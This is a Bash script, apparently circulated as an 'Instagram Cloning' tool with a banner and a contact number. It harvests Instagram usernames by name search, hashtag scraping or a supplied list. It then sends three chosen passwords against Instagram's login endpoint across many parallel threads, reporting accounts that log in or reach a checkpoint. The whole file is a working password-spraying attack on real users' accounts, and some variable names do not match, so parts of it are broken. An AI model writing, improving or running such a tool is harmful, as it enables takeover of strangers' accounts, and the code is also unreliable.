limit=50
logo="""\e[1;33m
┏━━┓╋╋╋╋╋┏┓
┗┫┣┛╋╋╋╋┏┛┗┓
╋┃┃┏━┓┏━┻┓┏╋━━┳━━┳━┳━━┳┓┏┓
╋┃┃┃┏┓┫━━┫┃┃┏┓┃┏┓┃┏┫┏┓┃┗┛┃
┏┫┣┫┃┃┣━━┃┗┫┏┓┃┗┛┃┃┃┏┓┃┃┃┃
┗━━┻┛┗┻━━┻━┻┛┗┻━┓┣┛┗┛┗┻┻┻┛
╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━┛┃
╋╋╋╋╋╋╋╋╋╋╋╋╋╋┗━━┛
\e[1;36m╭━━━┳╮
┃╭━╮┃┃
┃┃╱╰┫┃╭━━┳━╮╭┳━╮╭━━╮
┃┃╱╭┫┃┃╭╮┃╭╮╋┫╭╮┫╭╮┃
┃╰━╯┃╰┫╰╯┃┃┃┃┃┃┃┃╰╯┃
╰━━━┻━┻━━┻╯╰┻┻╯╰┻━╮┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶
\e[1;35m┏━━┓┏┓╋╋╋╋╋╋┏┓╋┏━┓┏━┓╋╋╋┏━┓
┃┏┓┃┃┃╋╋╋╋╋╋┃┃╋┃┃┗┛┃┃╋╋╋┃┏┛
┃┗┛┗┫┃┏━━┳━━┫┃┏┫┏┓┏┓┣━━┳┛┗┳┳━━┓
┃┏━┓┃┃┃┏┓┃┏━┫┗┛┫┃┃┃┃┃┏┓┣┓┏╋┫┏┓┃
┃┗━┛┃┗┫┏┓┃┗━┫┏┓┫┃┃┃┃┃┏┓┃┃┃┃┃┏┓┃
┗━━━┻━┻┛┗┻━━┻┛┗┻┛┗┛┗┻┛┗┛┗┛┗┻┛┗┛
\e[1;33mWhatsApp Number: \e[1;36m03094161457
\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶
"""
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
command -v $i >/dev/null 2>&1 || {
apt install jq
apt install curl
}
done
clear
echo -e "${logo}"
echo -e '''
\e[1;33m[1]\e[1;36m Crack By Searching Name
\e[1;33m[2]\e[1;35m Crack By HashTag
\e[1;33m[3]\e[1;34m Crack From List
'''
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
read -p $'\e[1;31m Select An Option   : \e[1;37m' opt
touch target
case $opt in
1) # menu 1
clear
echo -e "${logo}"
read -p $' \e[1;35mPut  Any  Name    : \e[1;37m' ask
collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
echo $' \e[1;33mTotal Users Found : '$collect''$(< target wc -l ; echo -e)
read -p $'\e[1;36m Put Password No 1 : \e[1;33m' Password1
read -p $'\e[1;36m Put Password No 2 : \e[1;33m' Password2
read -p $'\e[1;36m Put Password No 3 : \e[1;33m' Password3
echo -e "\e[1;32m Start cracking..."
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
echo -e " \e[1;36mTrying Password No 1"
;;
2) # menu 2
clear
echo -e "${logo}"
read -p $'\e[1;33m Put Any HashTag : \e[1;37m' Hashtag
get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
if [[ $get =~ "Page Not Found" ]]; then
echo -e " \e[1;31mHashtag not found\e[1;37m"
exit
else
echo -e "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
$(sort -u result > hashtag)
echo $" \e[1;33mTotal Users Found : "$(< hashtag wc -l ; echo -e)
read -p $'\e[1;35m Put Password No 1 : \e[1;34m' Password1
read -p $'\e[1;35m Put Password No 2 : \e[1;34m' Password2
read -p $'\e[1;35m Put Password No 3 : \e[1;34m' Password3
echo -e "\e[1;31m Start cracking..."
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
echo -e " \e[1;35mTrying Password No 1"
for tag in $(cat hashtag); do
echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
done
wait
rm hashtag result
fi
;;
3) # menu 3
clear
echo -e "${logo}"
read -p $'\e[1;33m Put The File Path : \e[1;37m' list
if [[ ! -e $list ]]; then
echo -e "\e[1;31mfile not found\e[1;37m"
exit
else
cat $list > target
echo $" \e[1;33mTotal Users Found : "$(< target wc -l)
read -p $'\e[1;34m Put Password No 1 : \e[1;35m' Password1
read -p $'\e[1;34m Put Password No 2 : \e[1;35m' Password2
read -p $'\e[1;34m Put Password No 3 : \e[1;35m' Password3
echo -e "\e[1;31m Start cracking..."
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
echo -e " \e[1;34mTrying Password No 1"
fi
;;
*) # wrong menu
echo -e "\e[1;31mselect the correct option"
sleep 1
clear
bash .README.md
esac
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
-H "cookie: csrftoken=${token}" \
-H "origin: https://www.instagram.com" \
-H "referer: https://www.instagram.com/accounts/login/" \
-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
-H "x-csrftoken: ${token}" \
-H "x-requested-with: XMLHttpRequest" \
-d "username=${i}&password=${ps1}")
login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
if [[ $login =~ "true" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;32mUsername : $i"
echo -e " Password : ${ps1}"
echo -e " Status   : Successfull"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
elif [[ $login =~ "false" ]]; then
echo -e "\e[1;36m[Not Cracked\e[1;36m]  @$i"
elif [[ $url =~ "checkpoint_required" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;36mUsername : $i"
echo -e " Password : ${ps1}"
echo -e " Status   : Checkpoint"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
fi
}
(
for i in $(cat target); do
((thread=thread%limit)); ((thread++==0)) && wait
brute "$i" &
done
wait
)
rm -rf target
touch target
case $opt in
1) # menu 1
echo -e ""
echo -e " \e[1;33mTrying Password No 2"
collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
;;
2) # menu 2
echo -e ""
echo -e " Trying Password No 2"
get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
if [[ $get =~ "Page Not Found" ]]; then
echo -e " \e[1;31mHashtag not found\e[1;37m"
exit
else
echo -e "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
$(sort -u result > hashtag)
for tag in $(cat hashtag); do
echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
done
wait
rm hashtag result
fi
;;
3) # menu 3
echo -e ""
echo -e " Trying Password No 2"
if [[ ! -e $list ]]; then
echo -e "\e[1;31mfile not found\e[1;37m"
exit
else
cat $list > target
fi
;;
esac
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
-H "cookie: csrftoken=${token}" \
-H "origin: https://www.instagram.com" \
-H "referer: https://www.instagram.com/accounts/login/" \
-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
-H "x-csrftoken: ${token}" \
-H "x-requested-with: XMLHttpRequest" \
-d "username=${i}&password=${ps2}")
login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
if [[ $login =~ "true" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;32mUsername : $i"
echo -e " Password : ${ps2}"
echo -e " Status   : Successfull"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
elif [[ $login =~ "false" ]]; then
echo -e "\e[1;35m[Not Cracked\e[1;35m]  @$i"
elif [[ $url =~ "checkpoint_required" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;35mUsername : $i"
echo -e " Password : ${ps2}"
echo -e " Status   : Checkpoint"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
fi
}
(
for i in $(cat target); do
((thread=thread%limit)); ((thread++==0)) && wait
brute "$i" &
done
wait
)
rm -rf target
case $opt in
1) # menu 1
echo -e ""
echo -e "\e[1;33m Trying Password No 3"
collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
;;
2) # menu 2
echo -e ""
echo -e " \e[1;33mTrying Password No 3"
get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
if [[ $get =~ "Page Not Found" ]]; then
echo -e " \e[1;31mHashtag not found\e[1;37m"
exit
else
echo -e "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
$(sort -u result > hashtag)
for tag in $(cat hashtag); do
echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
done
wait
rm hashtag result
fi
;;
3) # menu 3
echo -e ""
echo -e " \e[1;33mTrying Password No 3"
if [[ ! -e $list ]]; then
echo -e "\e[1;31mfile not found\e[1;37m"
exit
else
cat $list > target
fi
;;
esac
token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
-H "cookie: csrftoken=${token}" \
-H "origin: https://www.instagram.com" \
-H "referer: https://www.instagram.com/accounts/login/" \
-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
-H "x-csrftoken: ${token}" \
-H "x-requested-with: XMLHttpRequest" \
-d "username=${i}&password=${ps3}")
login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
if [[ $login =~ "true" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;32mUsername : $i"
echo -e " Password : ${ps3}"
echo -e " Status   : Successfull"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
elif [[ $login =~ "false" ]]; then
echo -e "\e[1;34m[Not Cracked\e[1;34m]  @$i"
elif [[ $url =~ "checkpoint_required" ]]; then
echo -e ""
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e " \e[1;34mUsername : $i"
echo -e " Password : ${ps3}"
echo -e " Status   : Checkpoint"
echo -e "\e[1;31m•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶•̶"
echo -e ""
fi
}
(
for i in $(cat target); do
((thread=thread%limit)); ((thread++==0)) && wait
brute "$i" &
done
wait
)
rm -rf target
echo -e
echo -e " Process has been complete"
read -p $" Press enter to go back"
bash .README.md
